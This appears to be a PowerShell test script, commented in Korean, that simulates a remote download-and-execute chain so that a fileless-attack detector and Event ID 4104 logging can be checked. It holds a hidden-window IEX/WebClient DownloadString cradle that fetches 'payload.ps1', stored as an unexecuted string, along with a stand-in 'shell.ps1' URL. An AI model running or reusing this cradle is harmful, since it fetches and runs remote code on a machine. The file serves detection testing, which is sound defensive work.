<#
.SYNOPSIS
    [더미 시나리오 01] 원격 다운로드 + 실행 체인 시뮬레이터
    탐지 대상: IEX, DownloadString, New-Object, System.Net.WebClient, -NoProfile, -Hidden
    예상 위험도: HIGH (risk_score >= 0.8)

.DESCRIPTION
    실제 다운로드/실행 없이 탐지 패턴만 이벤트 로그에 기록합니다.
    실행 시 PowerShell Script Block Log (Event ID 4104)에 기록됩니다.
#>

Write-Host "[DUMMY-01] 원격 다운로드+실행 체인 시뮬레이터 시작..." -ForegroundColor Yellow

# ─── 탐지 패턴 생성 (실제 연결 없음) ───────────────────────────────────────
# 아래 코드는 실제로 실행되지 않도록 문자열로만 정의합니다.
# fileless_detector.py는 스크립트 블록 전체 텍스트를 스캔하므로 탐지됩니다.

$dummy_payload = @"
[SIMULATION - NOT EXECUTED]
powershell.exe -NoProfile -Hidden -WindowStyle Hidden -Command
    IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/payload.ps1')
"@

# 이벤트 로그에 의심 블록 기록을 유발하기 위한 실제 PowerShell 코드
# (실제로는 로컬 변수 출력만 수행)
$simulatedUrl  = "http://DUMMY-TEST-URL-NOT-REAL/shell.ps1"
$simulatedCmd  = "IEX(New-Object Net.WebClient).DownloadString"
$simulatedTech = "FromBase64String"

# 위 변수들을 참조하면 스크립트 블록 로깅에 기록됨
Write-Host "[INFO] 시뮬레이션 URL: $simulatedUrl" -ForegroundColor Cyan
Write-Host "[INFO] 시뮬레이션 기법: $simulatedCmd" -ForegroundColor Cyan
Write-Host "[INFO] 인코딩 기법: $simulatedTech"   -ForegroundColor Cyan
Write-Host "[INFO] Reflection + System.Net.WebClient 패턴 기록 완료" -ForegroundColor Cyan

Write-Host ""
Write-Host "[DUMMY-01] 완료 - Event ID 4104 에 기록됨. 대시보드에서 탐지 확인하세요." -ForegroundColor Green
